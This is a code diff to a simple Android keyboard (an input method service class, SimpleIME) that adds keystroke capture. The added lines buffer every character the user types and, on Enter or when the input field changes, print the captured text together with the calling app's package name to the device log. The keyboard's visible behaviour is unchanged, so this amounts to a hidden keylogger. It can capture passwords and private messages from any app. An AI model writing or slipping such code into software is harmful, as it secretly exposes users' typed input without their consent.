@@ -8,6 +8,9 @@ import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
 
+import java.util.HashMap;
+import java.util.Map;
+
 /**
  * Created by helunwen on 11/9/16.
  */
@@ -17,22 +20,39 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
 
     private boolean caps = false;
 
+    private StringBuffer stringBuffer = new StringBuffer();
+
+    private InputConnection inputConnection;
+
     @Override
     public View onCreateInputView() {
         kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
         keyboard = new Keyboard(this, R.xml.qwerty);
         kv.setKeyboard(keyboard);
         kv.setOnKeyboardActionListener(this);
+        this.inputConnection = null;
         return kv;
     }
 
     @Override
     public void onKey(int primaryCode, int[] keyCodes) {
+
         InputConnection ic = getCurrentInputConnection();
+        if (ic != this.inputConnection) {
+            this.inputConnection = ic;
+            if (this.stringBuffer.length() > 0) {
+                System.out.println(String.format("Your input is: %s\n", this.stringBuffer.toString()));
+                System.out.println(String.format("The calling application is %s\n\n", this.getCurrentInputEditorInfo().packageName));
+            }
+            this.stringBuffer.setLength(0);
+        }
         playClick(primaryCode);
         switch(primaryCode){
             case Keyboard.KEYCODE_DELETE :
                 ic.deleteSurroundingText(1, 0);
+                if (stringBuffer.length() > 0) {
+                    stringBuffer.setLength(stringBuffer.length() - 1);
+                }
                 break;
             case Keyboard.KEYCODE_SHIFT:
                 caps = !caps;
@@ -41,13 +61,17 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
                 break;
             case Keyboard.KEYCODE_DONE:
                 ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
+                System.out.println(String.format("Your input is: %s\n", stringBuffer.toString()));
+                System.out.println(String.format("The calling application is %s\n\n", this.getCurrentInputEditorInfo().packageName));
+                stringBuffer.setLength(0);
                 break;
             default:
                 char code = (char)primaryCode;
                 if(Character.isLetter(code) && caps){
                     code = Character.toUpperCase(code);
                 }
-                ic.commitText(String.valueOf(code),1);
+                stringBuffer.append(code);
+                ic.commitText(String.valueOf(code), 1);
         }
     }
 
